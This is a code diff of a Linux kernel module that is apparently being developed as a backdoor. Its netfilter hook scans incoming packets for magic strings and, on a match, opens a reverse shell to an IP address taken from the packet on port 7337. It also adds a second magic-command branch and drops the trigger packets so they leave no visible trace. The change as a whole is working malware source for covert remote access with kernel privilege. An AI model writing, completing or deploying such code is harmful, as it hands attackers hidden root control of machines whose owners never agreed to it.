@@ -1,8 +1,8 @@
 #include "exec.c"
 
-const char* KEY = "POET";
+const char* sKEY = "POET~SH~";
+const char* cKEY = "POET~CM~";
 const char* PORT = "7337"; 
-const int nPORT = 7337;
 
 static unsigned int my_nf_hookIn(void *priv,
               struct sk_buff *skb,
@@ -67,67 +67,36 @@ static unsigned int my_nf_hookIn(void *priv,
         printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
         printk(KERN_DEBUG "%s\n", user_data);
         printk(KERN_INFO "%s\n", ip_source);
-        if (memcmp(user_data, KEY, strlen(KEY))==0)
+        if (memcmp(user_data, sKEY, strlen(sKEY))==0) // reverse shell 
         {
             char* revIP = kmalloc(32, GFP_KERNEL);
-            strncpy(revIP, user_data + 5, 32);
-            start_reverse_shell(revIP, PORT);
+            strncpy(revIP, user_data + 8, 32);
             printk(KERN_INFO "successful compare and %s\n", revIP);
+
+            start_reverse_shell(revIP, PORT);
 
             kfree(revIP);
             return NF_DROP;
+        } 
+        else if (memcmp(user_data, cKEY, strlen(cKEY))==0)
+        {
+            char* command = kmalloc(64, GFP_KERNEL);
+            strncpy(command, user_data + 8, 64);
+
+            // TODO add execute method call here
+
+            kfree(command);
+            return NF_DROP;
         }
-
         return NF_ACCEPT;
-
     }
     return NF_ACCEPT;
 }
 
 
-static unsigned int my_nf_hookOut(void *priv,
-              struct sk_buff *skb,
-              const struct nf_hook_state *state)
-{
-    struct iphdr *ip_header;        //ip header
-    struct tcphdr *tcp_header;      //tcp header
-    struct sk_buff *sock_buff = skb;//sock buffer
-    //Auxiliar
-    struct tcphdr _tcphdr;
-    struct iphdr _iph;
-
-    if (!sock_buff){
-        return NF_ACCEPT; //socket buffer empty
-    }
-    
-    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
-    if (!ip_header){
-        return NF_ACCEPT;
-    }
-
-    if(ip_header->protocol==IPPROTO_TCP){ 
-        unsigned int dport;
-
-        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
-
-        dport = htons((unsigned short int) tcp_header->dest);
-        if(dport == nPORT){
-            return NF_ACCEPT; 
-        }
-    }
-    return NF_QUEUE;
-}
-
 struct nf_hook_ops my_nfin = {
       .hook        = my_nf_hookIn,
       .hooknum     = NF_INET_PRE_ROUTING,
-      .pf          = PF_INET,
-      .priority    = NF_IP_PRI_FIRST
-};
-
-struct nf_hook_ops my_nfout = {
-      .hook        = my_nf_hookOut,
-      .hooknum     = NF_INET_LOCAL_OUT,
       .pf          = PF_INET,
       .priority    = NF_IP_PRI_FIRST
 };
